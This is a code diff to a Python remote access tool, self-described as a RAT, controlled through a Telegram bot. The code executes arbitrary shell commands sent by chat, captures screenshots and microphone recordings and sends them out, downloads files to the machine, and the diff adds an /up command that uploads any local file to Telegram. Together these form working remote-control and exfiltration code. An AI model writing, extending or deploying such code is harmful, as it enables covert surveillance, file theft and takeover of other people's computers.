@@ -22,7 +22,7 @@ import numpy as np
 nya=0
 rlko=0
 lang="tr" #For english type en. Türkçe için tr yazın.
-ROOT_ACCESS=[9573787782] #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
+ROOT_ACCESS=[956284394] #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
 xTOXEN="12341321:DA2doSKDWAD232SD2sDW23S" #Add your own toxen here. Buraya kendi toxeninizi yazın.
 db_exists=os.path.exists("database.db")
 conn=sqlite3.connect("database.db", check_same_thread=False)
@@ -88,7 +88,8 @@ def access(command): #Access the terminal. Komut satırına erişim.
     try:
         output = sp.getoutput(f"""{command}""")
         print(output)
-    except:
+    except Exception as e:
+        globalMessage(e)
         pass
 def eagleye(): #Capture screen photo. Ekran resmini kaydet.
     global spp
@@ -110,7 +111,7 @@ def batears(battime): #Capture the microphone. Bilgisayarın mikrofonunu kaydet.
         recr=sd.rec(int(battime*freq), dtype='float32')
         sd.wait() #Wait until rec finish.
         write(batname,freq,recr) #Save file.
-        sendFile(batpath)
+        sendFile(batpath,True)
     except:
         pass
 def download(url,filename):
@@ -149,12 +150,20 @@ def handle(msg):
         text="FileID:"+msg["photo"][0]["file_id"]
     else:
         text=msg["text"]
-    global sendFile
-    def sendFile(filename):
+    global sendFile,globalMessage
+    def globalMessage(msg):
+        try:
+            msg=str(msg)
+            bot.sendMessage(f"{msg}")
+        except:
+            pass
+    def sendFile(filename,removefile):
         try:
             bot.sendDocument(chatid,open(filename,"rb"))#fileid)
-            os.remove(filename)
-        except:
+            if removefile==True:
+                os.remove(filename)
+        except Exception as e:
+            bot.sendMessage(chatid,e)
             pass
     def sendImg(): #Send screen capture image to telegram. Telegram hesabımıza ekran görüntüsünü yollayalım.
         try:
@@ -174,9 +183,9 @@ def handle(msg):
             bot.sendMessage(chatid,f"Your User ID is: {userid}\nDo not share this information to anyone.")
     elif text=="/yardim" or text=="/help" or text=="/menu" or text=="/menü":
         if lang=="tr":
-            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.\n/userid User ID numaranızı gösterir.\n/rec 1-120 Saniye cinsinden bilgisayara bağlı mikrofon ile kayıt yapar.\nNot: Kayıt yaparken Windows altta mikrofon simgesi çıkarıyor.\n/menu bu menüyü açar. ",reply_markup=tr_menu)
+            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.\n/userid User ID numaranızı gösterir.\n/rec 1-120 Saniye cinsinden bilgisayara bağlı mikrofon ile kayıt yapar.\nNot: Kayıt yaparken Windows altta mikrofon simgesi çıkarıyor.\n/menu bu menüyü açar.\n/up C:/a.txt dosyasını telegrama yükler.\nDikkat: 50 MB üstü dosyaları yükleyemezsiniz.",reply_markup=tr_menu)
         else:
-            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.\n/userid Will show your User ID number.\n/rec 1-120 (Sec) Will record from computers microphone and send you as wav file.\nWarning: Windows shows microphone icon at taskbar.\n/menu will open this menu.",reply_markup=en_menu)
+            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.\n/userid Will show your User ID number.\n/rec 1-120 (Sec) Will record from computers microphone and send you as wav file.\nWarning: Windows shows microphone icon at taskbar.\n/menu will open this menu.\n/up C:/a.txt uploads a.txt to telegram.\nWarning: You can not upload files bigger than 50 MB.",reply_markup=en_menu)
         if userid in ROOT_ACCESS:
             if lang=="tr":
                 bot.sendMessage(chatid,"Admin yetkiniz vardır.")
@@ -241,6 +250,16 @@ def handle(msg):
                 batears(battime)
         except:
             pass
+    elif text.startswith("/up ") and userid in ROOT_ACCESS:
+        file_dir=text.replace("/up ","")
+        file_size=os.path.getsize(file_dir)
+        if file_size <= 50000000: #İf file size smaller then 50 mb since its telegrams bot limit. Dosya boyutu 50 mb küçükse telegramın bot limiti bu üstünü kabul etmiyor.
+            sendFile(file_dir,False)
+        else:
+            if lang=="tr":
+                bot.sendMessage(chatid,f"Dosya boyutu telegramın botlar için sınırı olan 50 MB'tan büyük!")
+            else:
+                bot.sendMessage(chatid,f"File size is bigger than 50 MB.\nThis is limitation from telegram for bot api.")
    except:
     pass
 if __name__=="__main__":
